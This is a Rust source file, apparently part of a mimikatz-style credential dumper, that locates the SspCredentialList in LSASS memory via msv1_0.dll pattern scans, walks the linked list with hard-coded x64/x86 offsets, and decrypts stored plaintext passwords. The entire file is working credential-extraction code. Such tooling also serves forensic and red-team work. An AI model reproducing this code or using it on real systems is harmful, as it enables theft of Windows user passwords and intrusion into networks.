use crate::error::Result;
use crate::lsass::crypto::CryptoKeys;
use crate::lsass::patterns;
use crate::lsass::types::{Arch, SspCredential, read_ptr, read_ustring, is_valid_user_ptr, walk_list, scan_data_for_list_head};
use crate::memory::VirtualMemory;
use crate::pe::parser::PeHeaders;

/// Per-arch offsets for KIWI_SSP_CREDENTIAL_LIST_ENTRY.
///
/// The struct contains a LIST_ENTRY at +0x00, then References/CredentialReferences,
/// then LUID, then inline KIWI_GENERIC_PRIMARY_CREDENTIAL (UserName, Domaine, Password).
struct SspOffsets {
    luid: u64,
    username: u64,
    domain: u64,
    password: u64,
}

const SSP_OFFSETS_X64: SspOffsets = SspOffsets {
    luid: 0x18,
    username: 0x30,
    domain: 0x40,
    password: 0x50,
};

const SSP_OFFSETS_X86: SspOffsets = SspOffsets {
    luid: 0x10,
    username: 0x24,
    domain: 0x2C,
    password: 0x34,
};

/// Extract SSP credentials from msv1_0.dll (unified x64/x86).
///
/// SSP stores credentials for custom Security Support Providers.
/// The SspCredentialList is a doubly-linked list in msv1_0.dll.
pub fn extract_ssp_credentials_arch(
    vmem: &dyn VirtualMemory,
    msv_base: u64,
    _msv_size: u32,
    keys: &CryptoKeys,
    arch: Arch,
) -> Result<Vec<(u64, SspCredential)>> {
    let offsets = match arch {
        Arch::X64 => &SSP_OFFSETS_X64,
        Arch::X86 => &SSP_OFFSETS_X86,
    };

    let pe = PeHeaders::parse_from_memory(vmem, msv_base)?;

    // Select patterns based on architecture
    let (pattern_list, pattern_label) = match arch {
        Arch::X64 => (patterns::SSP_CREDENTIAL_PATTERNS, "SspCredentialList"),
        Arch::X86 => (patterns::SSP_CREDENTIAL_PATTERNS_X86, "SspCredentialList_x86"),
    };

    // Try .text pattern scan first, fall back to .data section scan
    let list_addr = match pe.find_section(".text") {
        Some(text) => {
            let text_base = msv_base + text.virtual_address as u64;
            match patterns::find_pattern(
                vmem,
                text_base,
                text.virtual_size,
                pattern_list,
                pattern_label,
            ) {
                Ok((pattern_addr, _)) => {
                    // Resolve the list address from the pattern match
                    match arch {
                        Arch::X64 => {
                            patterns::find_list_via_lea(vmem, pattern_addr, "SspCredentialList")?
                        }
                        Arch::X86 => {
                            let ds = pe.find_section(".data");
                            if let Some(ds) = ds {
                                let data_base = msv_base + ds.virtual_address as u64;
                                let data_end = data_base + ds.virtual_size as u64;
                                patterns::find_list_via_abs(
                                    vmem, pattern_addr, msv_base,
                                    data_base, data_end, "ssp_x86",
                                ).unwrap_or_else(|_| {
                                    find_ssp_list_in_data(vmem, &pe, msv_base, arch)
                                        .unwrap_or(0)
                                })
                            } else {
                                find_ssp_list_in_data(vmem, &pe, msv_base, arch)?
                            }
                        }
                    }
                }
                Err(e) => {
                    log::debug!(
                        "SSP .text pattern scan failed ({}), trying .data fallback",
                        e
                    );
                    find_ssp_list_in_data(vmem, &pe, msv_base, arch)?
                }
            }
        }
        None => find_ssp_list_in_data(vmem, &pe, msv_base, arch)?,
    };

    if list_addr == 0 {
        return Ok(Vec::new());
    }

    log::info!("SSP SspCredentialList at 0x{:x} (arch={:?})", list_addr, arch);

    // Walk the linked list
    let mut results = Vec::new();

    walk_list(vmem, list_addr, arch, |current| {
        let luid = vmem.read_virt_u64(current + offsets.luid).unwrap_or(0);

        // Credentials are inline UNICODE_STRINGs (not behind a pointer)
        let username = read_ustring(vmem, current + offsets.username, arch).unwrap_or_default();
        let domain = read_ustring(vmem, current + offsets.domain, arch).unwrap_or_default();

        if !username.is_empty() {
            let password = crate::lsass::crypto::decrypt_unicode_string_password_cfb8(
                vmem,
                current + offsets.password,
                keys,
                arch,
            );

            log::debug!(
                "SSP: LUID=0x{:x} user={} domain={} pwd_len={}",
                luid,
                username,
                domain,
                password.len()
            );
            results.push((
                luid,
                SspCredential {
                    username,
                    domain,
                    password,
                },
            ));
        }
        true
    })?;

    let with_passwords = results
        .iter()
        .filter(|(_, c)| !c.password.is_empty())
        .count();
    log::info!(
        "SSP: found {} entries ({} with passwords)",
        results.len(),
        with_passwords
    );

    Ok(results)
}

/// Fallback: scan msv1_0.dll .data section for SspCredentialList LIST_ENTRY head.
///
/// Validates candidates by checking that the first entry has a valid LUID
/// and credentials at the expected offsets.
fn find_ssp_list_in_data(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    msv_base: u64,
    arch: Arch,
) -> Result<u64> {
    let offsets = match arch {
        Arch::X64 => &SSP_OFFSETS_X64,
        Arch::X86 => &SSP_OFFSETS_X86,
    };

    scan_data_for_list_head(
        vmem, pe, msv_base, arch, 0x10000, "msv1_0.dll", 0x100000,
        true, "SspCredentialList",
        |flink, list_addr| {
            let entry_flink = match read_ptr(vmem, flink, arch) {
                Ok(f) => f,
                Err(_) => return false,
            };
            if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
                return false;
            }
            let luid = match vmem.read_virt_u64(flink + offsets.luid) {
                Ok(l) => l,
                Err(_) => return false,
            };
            if luid == 0 || luid > 0xFFFFFFFF {
                return false;
            }
            let username = read_ustring(vmem, flink + offsets.username, arch).unwrap_or_default();
            if username.is_empty() {
                return false;
            }
            log::debug!(
                "SSP: found SspCredentialList candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x}",
                list_addr, flink, luid
            );
            true
        },
    )
}
